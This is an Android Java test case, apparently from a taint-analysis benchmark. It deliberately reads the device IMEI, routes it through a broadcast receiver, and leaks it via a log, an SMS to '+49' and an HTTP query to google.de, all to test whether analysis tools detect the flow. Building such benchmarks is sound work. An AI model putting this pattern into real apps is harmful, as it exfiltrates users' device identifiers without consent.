package edu.mit.icc_broadcast_programmatic_intentfilter;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name ICC-Broadcast-Programmatic-IntentFilter
 * 
 * @description   Testing BroadcastReceiver through programmatic setting up of IntentFilter 
 * @dataflow source -> sink
 * @number_of_leaks 1
 * @challenges    The analysis tool has to be able to recognize a broadcast receiver and models its IntentFilter
 */
public class BroadcastTest extends Activity {
    private static String ACTION = "edu.mit.icc_broadcast_programmatic_intentfilter.action";

    public void onCreate(Bundle bundle) {
    	super.onCreate(bundle);

        setContentView(R.layout.main);

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        BroadcastReceiver receiver = new BroadcastReceiver(){
                public void onReceive(Context c, Intent i) {
                    String taint = i.getStringExtra("imei");

                    if (taint != null) {
                        Log.i("DroidBench", taint); //sink
                        SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage("+49", null, taint, null, null);  //sink, leak

                        try {
                            connect(taint);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }				  
            };

        this.registerReceiver(receiver, new IntentFilter(ACTION));
    }

    public void onDestroy() {
        //this is tainted!!!
	TelephonyManager mgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
	String imei = mgr.getDeviceId(); //source

        Intent intent = new Intent(ACTION);
        intent.putExtra("imei", imei);

        sendBroadcast(intent);
        super.onDestroy();
    }

    private void connect(String data) throws IOException {
        String URL = "http://www.google.de/search?q=";
        URL = URL.concat(data);
        java.net.URL url = new URL(URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
        conn.setRequestMethod("GET");
        conn.setDoInput(true);
        // Starts the query
        conn.connect();
        Log.d(getClass().getSimpleName(), URL);

        InputStream is = conn.getInputStream();
        if (is == null)
            return;
        StringBuilder sb = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line = null;
        try {
            while ((line = br.readLine()) != null)
                sb.append(line);
        } finally {
            br.close();
            is.close();
        }
        Log.d(getClass().getSimpleName(), sb.toString());
    }
}
